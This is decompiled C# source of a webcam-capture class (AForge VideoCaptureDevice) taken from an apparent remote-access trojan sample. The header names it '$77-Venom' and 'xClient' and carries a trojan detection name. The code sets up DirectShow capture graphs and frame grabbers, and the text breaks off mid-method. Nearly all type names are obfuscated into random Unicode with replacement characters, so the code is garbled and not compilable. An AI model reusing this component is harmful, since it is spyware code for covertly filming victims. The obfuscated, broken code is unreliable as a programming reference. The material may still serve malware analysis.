// Decompiled with JetBrains decompiler
// Type: xClient.Core.AForge.Video.DirectShow.VideoCaptureDevice
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Threading;
using xClient.Core.AForge.Video.DirectShow.Internals;

namespace xClient.Core.AForge.Video.DirectShow
{
  public class VideoCaptureDevice : 廧赲匑䡿ᣖ谧\uE923䩣ഘ㪅ꬥ胜꾀㤼\uFFFDԶ涸痐\uE06Cﬂ
  {
    private string deviceMoniker;
    private int framesReceived;
    private long bytesReceived;
    private \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB videoResolution;
    private \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB snapshotResolution;
    private bool provideSnapshots;
    private Thread thread;
    private ManualResetEvent stopEvent;
    private \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[] videoCapabilities;
    private \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[] snapshotCapabilities;
    private bool needToSetVideoInput;
    private bool needToSimulateTrigger;
    private bool needToDisplayPropertyPage;
    private bool needToDisplayCrossBarPropertyPage;
    private IntPtr parentWindowForPropertyPage = IntPtr.Zero;
    private object sourceObject;
    private DateTime startTime;
    private object sync = new object();
    private bool? isCrossbarAvailable;
    private 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205[] crossbarVideoInputs;
    private 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205 crossbarVideoInput = 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205.Default;
    private static Dictionary<string, \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[]> cacheVideoCapabilities = new Dictionary<string, \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[]>();
    private static Dictionary<string, \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[]> cacheSnapshotCapabilities = new Dictionary<string, \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[]>();
    private static Dictionary<string, 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205[]> cacheCrossbarVideoInputs = new Dictionary<string, 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205[]>();

    public 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205 CrossbarVideoInput
    {
      get => this.crossbarVideoInput;
      set
      {
        this.needToSetVideoInput = true;
        this.crossbarVideoInput = value;
      }
    }

    public 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205[] AvailableCrossbarVideoInputs
    {
      get
      {
        if (this.crossbarVideoInputs == null)
        {
          lock (VideoCaptureDevice.cacheCrossbarVideoInputs)
          {
            if (!string.IsNullOrEmpty(this.deviceMoniker))
            {
              if (VideoCaptureDevice.cacheCrossbarVideoInputs.ContainsKey(this.deviceMoniker))
                this.crossbarVideoInputs = VideoCaptureDevice.cacheCrossbarVideoInputs[this.deviceMoniker];
            }
          }
          if (this.crossbarVideoInputs == null)
          {
            if (!this.IsRunning)
            {
              this.WorkerThread(false);
            }
            else
            {
              for (int index = 0; index < 500 && this.crossbarVideoInputs == null; ++index)
                Thread.Sleep(10);
            }
          }
        }
        return this.crossbarVideoInputs == null ? new 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205[0] : this.crossbarVideoInputs;
      }
    }

    public bool ProvideSnapshots
    {
      get => this.provideSnapshots;
      set => this.provideSnapshots = value;
    }

    public event 봛㵅퉽\uEEA8\uF430ꗉ㮩ᇨ赧쮬鏭缪ଂ燞슐汎\uF35E扷䇓\uE49F NewFrame;

    public event 봛㵅퉽\uEEA8\uF430ꗉ㮩ᇨ赧쮬鏭缪ଂ燞슐汎\uF35E扷䇓\uE49F SnapshotFrame;

    public event 쾗쭄勣苧쨒\u2EEB떁쭯堆ំ뒕셙棡祐젣\uA95C\u22EB蟦뼗묑 VideoSourceError;

    public event 㮅ጵ菆\uF386파ᛢ邁崒唫㰄\u31E4ⴧ慲啪ཷ訳蘽訿唹\u2630 PlayingFinished;

    public virtual string Source
    {
      get => this.deviceMoniker;
      set
      {
        this.deviceMoniker = value;
        this.videoCapabilities = (\uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[]) null;
        this.snapshotCapabilities = (\uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[]) null;
        this.crossbarVideoInputs = (賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205[]) null;
        this.isCrossbarAvailable = new bool?();
      }
    }

    public int FramesReceived
    {
      get
      {
        int framesReceived = this.framesReceived;
        this.framesReceived = 0;
        return framesReceived;
      }
    }

    public long BytesReceived
    {
      get
      {
        long bytesReceived = this.bytesReceived;
        this.bytesReceived = 0L;
        return bytesReceived;
      }
    }

    public bool IsRunning
    {
      get
      {
        if (this.thread != null)
        {
          if (!this.thread.Join(0))
            return true;
          this.Free();
        }
        return false;
      }
    }

    [Obsolete]
    public Size DesiredFrameSize
    {
      get => Size.Empty;
      set
      {
      }
    }

    [Obsolete]
    public Size DesiredSnapshotSize
    {
      get => Size.Empty;
      set
      {
      }
    }

    [Obsolete]
    public int DesiredFrameRate
    {
      get => 0;
      set
      {
      }
    }

    public \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB VideoResolution
    {
      get => this.videoResolution;
      set => this.videoResolution = value;
    }

    public \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB SnapshotResolution
    {
      get => this.snapshotResolution;
      set => this.snapshotResolution = value;
    }

    public \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[] VideoCapabilities
    {
      get
      {
        if (this.videoCapabilities == null)
        {
          lock (VideoCaptureDevice.cacheVideoCapabilities)
          {
            if (!string.IsNullOrEmpty(this.deviceMoniker))
            {
              if (VideoCaptureDevice.cacheVideoCapabilities.ContainsKey(this.deviceMoniker))
                this.videoCapabilities = VideoCaptureDevice.cacheVideoCapabilities[this.deviceMoniker];
            }
          }
          if (this.videoCapabilities == null)
          {
            if (!this.IsRunning)
            {
              this.WorkerThread(false);
            }
            else
            {
              for (int index = 0; index < 500 && this.videoCapabilities == null; ++index)
                Thread.Sleep(10);
            }
          }
        }
        return this.videoCapabilities == null ? new \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[0] : this.videoCapabilities;
      }
    }

    public \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[] SnapshotCapabilities
    {
      get
      {
        if (this.snapshotCapabilities == null)
        {
          lock (VideoCaptureDevice.cacheSnapshotCapabilities)
          {
            if (!string.IsNullOrEmpty(this.deviceMoniker))
            {
              if (VideoCaptureDevice.cacheSnapshotCapabilities.ContainsKey(this.deviceMoniker))
                this.snapshotCapabilities = VideoCaptureDevice.cacheSnapshotCapabilities[this.deviceMoniker];
            }
          }
          if (this.snapshotCapabilities == null)
          {
            if (!this.IsRunning)
            {
              this.WorkerThread(false);
            }
            else
            {
              for (int index = 0; index < 500 && this.snapshotCapabilities == null; ++index)
                Thread.Sleep(10);
            }
          }
        }
        return this.snapshotCapabilities == null ? new \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[0] : this.snapshotCapabilities;
      }
    }

    public object SourceObject => this.sourceObject;

    public VideoCaptureDevice()
    {
    }

    public VideoCaptureDevice(string deviceMoniker) => this.deviceMoniker = deviceMoniker;

    public void Start()
    {
      if (this.IsRunning)
        return;
      if (string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      this.framesReceived = 0;
      this.bytesReceived = 0L;
      this.isCrossbarAvailable = new bool?();
      this.needToSetVideoInput = true;
      this.stopEvent = new ManualResetEvent(false);
      lock (this.sync)
      {
        this.thread = new Thread(new ThreadStart(this.WorkerThread));
        this.thread.Name = this.deviceMoniker;
        this.thread.Start();
      }
    }

    public void SignalToStop()
    {
      if (this.thread == null)
        return;
      this.stopEvent.Set();
    }

    public void WaitForStop()
    {
      if (this.thread == null)
        return;
      this.thread.Join();
      this.Free();
    }

    public void Stop()
    {
      if (!this.IsRunning)
        return;
      this.thread.Abort();
      this.WaitForStop();
    }

    private void Free()
    {
      this.thread = (Thread) null;
      this.stopEvent.Close();
      this.stopEvent = (ManualResetEvent) null;
    }

    public void DisplayPropertyPage(IntPtr parentWindow)
    {
      if (this.deviceMoniker == null || this.deviceMoniker == string.Empty)
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        if (this.IsRunning)
        {
          this.parentWindowForPropertyPage = parentWindow;
          this.needToDisplayPropertyPage = true;
        }
        else
        {
          object filter;
          try
          {
            filter = FilterInfo.CreateFilter(this.deviceMoniker);
          }
          catch
          {
            throw new ApplicationException("Failed creating device object for moniker.");
          }
          if (!(filter is 䚀㴹\uF85D飘獅䕎\uF2BB콇\uFDED\uE6AB糳뤅䬻\u319Eⴱ芬턜曰䭫䝘))
            throw new NotSupportedException("The video source does not support configuration property page.");
          this.DisplayPropertyPage(parentWindow, filter);
          Marshal.ReleaseComObject(filter);
        }
      }
    }

    public void DisplayCrossbarPropertyPage(IntPtr parentWindow)
    {
      lock (this.sync)
      {
        for (int index = 0; index < 500 && !this.isCrossbarAvailable.HasValue && this.IsRunning; ++index)
          Thread.Sleep(10);
        if (!this.IsRunning || !this.isCrossbarAvailable.HasValue)
          throw new ApplicationException("The video source must be running in order to display crossbar property page.");
        if (!this.isCrossbarAvailable.Value)
          throw new NotSupportedException("Crossbar configuration is not supported by currently running video source.");
        this.parentWindowForPropertyPage = parentWindow;
        this.needToDisplayCrossBarPropertyPage = true;
      }
    }

    public bool CheckIfCrossbarAvailable()
    {
      lock (this.sync)
      {
        if (!this.isCrossbarAvailable.HasValue)
        {
          if (!this.IsRunning)
          {
            this.WorkerThread(false);
          }
          else
          {
            for (int index = 0; index < 500 && !this.isCrossbarAvailable.HasValue; ++index)
              Thread.Sleep(10);
          }
        }
        return this.isCrossbarAvailable.HasValue && this.isCrossbarAvailable.Value;
      }
    }

    public void SimulateTrigger() => this.needToSimulateTrigger = true;

    public bool SetCameraProperty(
      楾눍\uEFB0\u31DD豱깿ᖋ㝛\uF6DD増옏羽黎昸〯ڨ\uE81F즸㩦눣 property,
      int value,
      \u0881뫮\uE63C榬\u21BDﾼ鮝ट핔ॄ췄뜸ꁈ짾埊숹ؠ嘮粐\u23FB controlFlags)
    {
      bool flag = true;
      if (this.deviceMoniker == null || string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        object filter;
        try
        {
          filter = FilterInfo.CreateFilter(this.deviceMoniker);
        }
        catch
        {
          throw new ApplicationException("Failed creating device object for moniker.");
        }
        if (!(filter is 횗\u29D7篸쫷\u218E醚\uFFFD浢\u002D턹\uFFFD䙢뙫ᩄ墠魲克뚃䊉琉))
          throw new NotSupportedException("The video source does not support camera control.");
        flag = ((횗\u29D7篸쫷\u218E醚\uFFFD浢\u002D턹\uFFFD䙢뙫ᩄ墠魲克뚃䊉琉) filter).Set(property, value, controlFlags) >= 0;
        Marshal.ReleaseComObject(filter);
      }
      return flag;
    }

    public bool GetCameraProperty(
      楾눍\uEFB0\u31DD豱깿ᖋ㝛\uF6DD増옏羽黎昸〯ڨ\uE81F즸㩦눣 property,
      out int value,
      out \u0881뫮\uE63C榬\u21BDﾼ鮝ट핔ॄ췄뜸ꁈ짾埊숹ؠ嘮粐\u23FB controlFlags)
    {
      bool cameraProperty = true;
      if (this.deviceMoniker == null || string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        object filter;
        try
        {
          filter = FilterInfo.CreateFilter(this.deviceMoniker);
        }
        catch
        {
          throw new ApplicationException("Failed creating device object for moniker.");
        }
        if (!(filter is 횗\u29D7篸쫷\u218E醚\uFFFD浢\u002D턹\uFFFD䙢뙫ᩄ墠魲克뚃䊉琉))
          throw new NotSupportedException("The video source does not support camera control.");
        cameraProperty = ((횗\u29D7篸쫷\u218E醚\uFFFD浢\u002D턹\uFFFD䙢뙫ᩄ墠魲克뚃䊉琉) filter).Get(property, out value, out controlFlags) >= 0;
        Marshal.ReleaseComObject(filter);
      }
      return cameraProperty;
    }

    public bool GetCameraPropertyRange(
      楾눍\uEFB0\u31DD豱깿ᖋ㝛\uF6DD増옏羽黎昸〯ڨ\uE81F즸㩦눣 property,
      out int minValue,
      out int maxValue,
      out int stepSize,
      out int defaultValue,
      out \u0881뫮\uE63C榬\u21BDﾼ鮝ट핔ॄ췄뜸ꁈ짾埊숹ؠ嘮粐\u23FB controlFlags)
    {
      bool cameraPropertyRange = true;
      if (this.deviceMoniker == null || string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        object filter;
        try
        {
          filter = FilterInfo.CreateFilter(this.deviceMoniker);
        }
        catch
        {
          throw new ApplicationException("Failed creating device object for moniker.");
        }
        if (!(filter is 횗\u29D7篸쫷\u218E醚\uFFFD浢\u002D턹\uFFFD䙢뙫ᩄ墠魲克뚃䊉琉))
          throw new NotSupportedException("The video source does not support camera control.");
        cameraPropertyRange = ((횗\u29D7篸쫷\u218E醚\uFFFD浢\u002D턹\uFFFD䙢뙫ᩄ墠魲克뚃䊉琉) filter).GetRange(property, out minValue, out maxValue, out stepSize, out defaultValue, out controlFlags) >= 0;
        Marshal.ReleaseComObject(filter);
      }
      return cameraPropertyRange;
    }

    private void WorkerThread() => this.WorkerThread(true);

    private void WorkerThread(bool runGraph)
    {
      可喣ꢩ垉\uF16C텞辂ᳩ\u229B싻晀ֵ륊ꪵ뼵씇蕅Ⰱ\u2F31ᆋ reason = 可喣ꢩ垉\uF16C텞辂ᳩ\u229B싻晀ֵ륊ꪵ뼵씇蕅Ⰱ\u2F31ᆋ.䖥껖鷳咽轳殞Ꙙ䳁ፘ\uFFFD뭺\uF746\uE669\uE2E5졲騉֠ⶅ\u2BE4䜰;
      bool flag = false;
      VideoCaptureDevice.Grabber callback1 = new VideoCaptureDevice.Grabber(this, false);
      VideoCaptureDevice.Grabber callback2 = new VideoCaptureDevice.Grabber(this, true);
      object o1 = (object) null;
      object o2 = (object) null;
      object o3 = (object) null;
      object o4 = (object) null;
      object retInterface = (object) null;
      \uFDDC\u2F9F魑\uFFFD헃磺嵪뤄氽䁤䬧냽蠬豟१鳕᪆\uF70F\uF3FD\uFFFD 魑헃磺嵪뤄氽䁤䬧냽蠬豟१鳕᪆ = (\uFDDC\u2F9F魑\uFFFD헃磺嵪뤄氽䁤䬧냽蠬豟१鳕᪆\uF70F\uF3FD\uFFFD) null;
      \u20E6詫ꅳ糙ᬛ憂祂埖Ű呧酞\uF670\uEB8A瑜溢\uECE6䑵淐跏ﯥ obj1 = (\u20E6詫ꅳ糙ᬛ憂祂埖Ű呧酞\uF670\uEB8A瑜溢\uECE6䑵淐跏ﯥ) null;
      ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67 ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐1 = (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67) null;
      ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67 ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐2 = (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67) null;
      ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67 ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐3 = (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67) null;
      \u0BEA\uF397欫艎뭕\u2FF0蓈Ėᡙ艹偌퍆嗘홦\uEA49随奉尤\uEA74熯 obj2 = (\u0BEA\uF397欫艎뭕\u2FF0蓈Ėᡙ艹偌퍆嗘홦\uEA49随奉尤\uEA74熯) null;
      \u0BEA\uF397欫艎뭕\u2FF0蓈Ėᡙ艹偌퍆嗘홦\uEA49随奉尤\uEA74熯 obj3 = (\u0BEA\uF397欫艎뭕\u2FF0蓈Ėᡙ艹偌퍆嗘홦\uEA49随奉尤\uEA74熯) null;
      \uFFFD\uE49D\uFB0Fⷈ\uFFFDꇾ닫\uF0EA킞\u2878ⵄ摥\u2DC7犑럁\u17FB쬰긶幗\uFFFD ⷈꇾ닫킞ⵄ摥犑럁쬰긶幗1 = (\uFFFD\uE49D\uFB0Fⷈ\uFFFDꇾ닫\uF0EA킞\u2878ⵄ摥\u2DC7犑럁\u17FB쬰긶幗\uFFFD) null;
      秎윹ɖ紒뱤퓯Ø歛猲\u32E0炖\u27B0噙음뇔쟘錘席䃲꾀 秎윹ɖ紒뱤퓯Ø歛猲炖噙음뇔쟘錘席䃲꾀 = (秎윹ɖ紒뱤퓯Ø歛猲\u32E0炖\u27B0噙음뇔쟘錘席䃲꾀) null;
      漣獷鶣\u2E3Dᜈ鮕ု論唅覂왁쑗ꊬꇧꉴ愻㳜ើ羽\uFFFD 漣獷鶣ᜈ鮕ု論唅覂왁쑗ꊬꇧꉴ愻㳜ើ羽1 = (漣獷鶣\u2E3Dᜈ鮕ု論唅覂왁쑗ꊬꇧꉴ愻㳜ើ羽\uFFFD) null;
      嬋\uFFFD纓\u1FDDᒼ룗썍\uFFFD\uFFFD矁崏䐈窩ꐟ歎儹螪\u2360䳁\u2FEE pin = (嬋\uFFFD纓\u1FDDᒼ룗썍\uFFFD\uFFFD矁崏䐈窩ꐟ歎儹螪\u2360䳁\u2FEE) null;
      ᆭ㾝硠\uEDA7\uEBB9䀹ꉾ\uE5C5댞住ﺷᐧા\uFE3Aw睘龟퀮\uE68C\u2374 ᆭ㾝硠䀹ꉾ댞住ﺷᐧાW睘龟퀮 = (ᆭ㾝硠\uEDA7\uEBB9䀹ꉾ\uE5C5댞住ﺷᐧા\uFE3Aw睘龟퀮\uE68C\u2374) null;
      try
      {
        Type typeFromClsid1 = Type.GetTypeFromCLSID(轆뾯橍韎\uF178ᥜ\u1C90뎭됚C椲ۿ\u20A0伒涮렶\u25C9ꉮ䓫ꐇ.玟喘졘쨖ऊ銣ᯣ蹰㪑㙩꽸੨㔎ꇐ남慚䖙\u23D3睻\uED56);
        o1 = !(typeFromClsid1 == (Type) null) ? Activator.CreateInstance(typeFromClsid1) : throw new ApplicationException("Failed creating capture graph builder");
        \uFDDC\u2F9F魑\uFFFD헃磺嵪뤄氽䁤䬧냽蠬豟१鳕᪆\uF70F\uF3FD\uFFFD graphBuilder1 = (\uFDDC\u2F9F魑\uFFFD헃磺嵪뤄氽䁤䬧냽蠬豟१鳕᪆\uF70F\uF3FD\uFFFD) o1;
        Type typeFromClsid2 = Type.GetTypeFromCLSID(轆뾯橍韎\uF178ᥜ\u1C90뎭됚C椲ۿ\u20A0伒涮렶\u25C9ꉮ䓫ꐇ.\uE780\u180F\uE91C勭\uE068楛찓犐\uEE45೨\uF53D᠌춡뚤\uFFFD\u2108騾蜭䚍豅);
        o2 = !(typeFromClsid2 == (Type) null) ? Activator.CreateInstance(typeFromClsid2) : throw new ApplicationException("Failed creating filter graph");
        \u20E6詫ꅳ糙ᬛ憂祂埖Ű呧酞\uF670\uEB8A瑜溢\uECE6䑵淐跏ﯥ graphBuilder2 = (\u20E6詫ꅳ糙ᬛ憂祂埖Ű呧酞\uF670\uEB8A瑜溢\uECE6䑵淐跏ﯥ) o2;
        graphBuilder1.SetFiltergraph((ﰝﯝ샡ᮟ\uECD5鰙\uF381䗗붣ಮ䓂屠\u0AD6낎畹킽\uEB54ｦ侽녵) graphBuilder2);
        this.sourceObject = FilterInfo.CreateFilter(this.deviceMoniker);
        ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67 ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐4 = this.sourceObject != null ? (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67) this.sourceObject : throw new ApplicationException("Failed creating device object for moniker");
        try
        {
          秎윹ɖ紒뱤퓯Ø歛猲炖噙음뇔쟘錘席䃲꾀 = (秎윹ɖ紒뱤퓯Ø歛猲\u32E0炖\u27B0噙음뇔쟘錘席䃲꾀) this.sourceObject;
        }
        catch
        {
        }
        Type typeFromClsid3 = Type.GetTypeFromCLSID(轆뾯橍韎\uF178ᥜ\u1C90뎭됚C椲ۿ\u20A0伒涮렶\u25C9ꉮ䓫ꐇ.售壃寋\u24F0姞䈸蘶扂巢䰨맒務个뚌ڌ哽Ꙁ\u26D2\uEE4Cこ);
        o3 = !(typeFromClsid3 == (Type) null) ? Activator.CreateInstance(typeFromClsid3) : throw new ApplicationException("Failed creating sample grabber");
        \u0BEA\uF397欫艎뭕\u2FF0蓈Ėᡙ艹偌퍆嗘홦\uEA49随奉尤\uEA74熯 obj4 = (\u0BEA\uF397欫艎뭕\u2FF0蓈Ėᡙ艹偌퍆嗘홦\uEA49随奉尤\uEA74熯) o3;
        ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67 ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐5 = (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67) o3;
        o4 = Activator.CreateInstance(typeFromClsid3);
        \u0BEA\uF397欫艎뭕\u2FF0蓈Ėᡙ艹偌퍆嗘홦\uEA49随奉尤\uEA74熯 obj5 = (\u0BEA\uF397欫艎뭕\u2FF0蓈Ėᡙ艹偌퍆嗘홦\uEA49随奉尤\uEA74熯) o4;
        ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67 ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐6 = (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67) o4;
        graphBuilder2.AddFilter(ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐4, "source");
        graphBuilder2.AddFilter(ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐5, "grabber_video");
        graphBuilder2.AddFilter(ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐6, "grabber_snapshot");
        AMMediaType mediaType = new AMMediaType();
        mediaType.MajorType = 蔻믠\uF06D쏀퀨흔\u23BDӏ씤崞뼜\u327D\u22FD佅橵갰햲䠋ᙝ\uE149.\uE49E锫\u2F70ꨕ笳ī\uEF88\u20CB\uE537ﾶꤹ뇬ꧮ轢金\uE47Dܨ\uFDE5\uF6B6̧;
        mediaType.SubType = 㶤颇\u2738ꡤ\u29A0ݧ뫑偣\uEF56龧\uF4E1캌᭖\u2571틻ﱍﹱ㓙晼눒.ڹ覊\uE094媕晅\uE22C룁ℕ菧禖\u002D蜃쪰钝敡鲄\u2004ꨋ쀂宓;
        obj4.SetMediaType(mediaType);
        obj5.SetMediaType(mediaType);
        graphBuilder1.FindInterface(득\u2204ោ闻䐩\u336B酵眲\uFFFD舷\u2700柩爛툰邱ꦝ\uFFFD縧\uF301\uFFFD.驅撥앂\uF687\uEE8Aⵦᗧ\uE9C8됇셃\uE627鐗銓꛱燑뙵윩줉\uF0DDꅴ, Guid.Empty, ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐4, typeof (ᆭ㾝硠\uEDA7\uEBB9䀹ꉾ\uE5C5댞住ﺷᐧા\uFE3Aw睘龟퀮\uE68C\u2374).GUID, out retInterface);
        if (retInterface != null)
          ᆭ㾝硠䀹ꉾ댞住ﺷᐧાW睘龟퀮 = (ᆭ㾝硠\uEDA7\uEBB9䀹ꉾ\uE5C5댞住ﺷᐧા\uFE3Aw睘龟퀮\uE68C\u2374) retInterface;
        this.isCrossbarAvailable = new bool?(ᆭ㾝硠䀹ꉾ댞住ﺷᐧાW睘龟퀮 != null);
        this.crossbarVideoInputs = this.ColletCrossbarVideoInputs(ᆭ㾝硠䀹ꉾ댞住ﺷᐧાW睘龟퀮);
        if (秎윹ɖ紒뱤퓯Ø歛猲炖噙음뇔쟘錘席䃲꾀 != null)
        {
          graphBuilder1.FindPin(this.sourceObject, \uF07C괐픉먥褬睋饦㜺퉽偀縸挜舿ī덢똧ᖍ\u0089꤇籫.\uFFFD\uFFFD黃ኴ聾龜ᘼ\u0FEF楟\uE427\uE67D\uE222쑖车ꇸܲ뗹\u074C蛀烖, \uA635湈붺䮘㔊谋蓝巉\u2E07繸ব繑㶻\uF513Ꮏ䓷咻賑\u2621䬣.佌听\uE545쾘뽠鱇묺鑱鋋\uFFFD\uF681눫ࠜ\u33A0ꊀ䀫鬏鐫띩ᯋ, 蔻믠\uF06D쏀퀨흔\u23BDӏ씤崞뼜\u327D\u22FD佅橵갰햲䠋ᙝ\uE149.\uE49E锫\u2F70ꨕ笳ī\uEF88\u20CB\uE537ﾶꤹ뇬ꧮ轢金\uE47Dܨ\uFDE5\uF6B6̧, false, 0, out pin);
          if (pin != null)
          {
            ꏫ㹔棥蛱㖳矊ꬡ鸛\u2152嵝컣菠馺䀕㔏\uEB90ﷆ愿\uFF20臰 flags;
            秎윹ɖ紒뱤퓯Ø歛猲炖噙음뇔쟘錘席䃲꾀.GetCaps(pin, out flags);
            flag = (flags & ꏫ㹔棥蛱㖳矊ꬡ鸛\u2152嵝컣菠馺䀕㔏\uEB90ﷆ愿\uFF20臰.券\uE0D2\uE037쐰昑㴣\uEDF7\u21BB\u1717\uFFFD\u2117\uECAE誔ﻹ\uE4DB枫鉔湇矂\u2B7A) != 0;
          }
        }
        obj4.SetBufferSamples(false);
        obj4.SetOneShot(false);
        obj4.SetCallback((䝗\u2BF1跃\uED65괕ᘂ괂脴觸炊鄺㫫ᷙ㛫䮭ừ䋋盰\u20FF깔) callback1, 1);
        obj5.SetBufferSamples(true);
        obj5.SetOneShot(false);
        obj5.SetCallback((䝗\u2BF1跃\uED65괕ᘂ괂脴觸炊鄺㫫ᷙ㛫䮭ừ䋋盰\u20FF깔) callback2, 1);
        this.GetPinCapabilitiesAndConfigureSizeAndRate(graphBuilder1, ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐4, \uA635湈붺䮘㔊谋蓝巉\u2E07繸ব繑㶻\uF513Ꮏ䓷咻賑\u2621䬣.ꇜ\uE89D\u2BB3暇捱뽺\uEAECⶼ\uF49A礃豾\uE3A5﨏쪥挛\u23AA\uF3BC\u2A89롆ꆛ, this.videoResolution, ref this.videoCapabilities);
        if (flag)
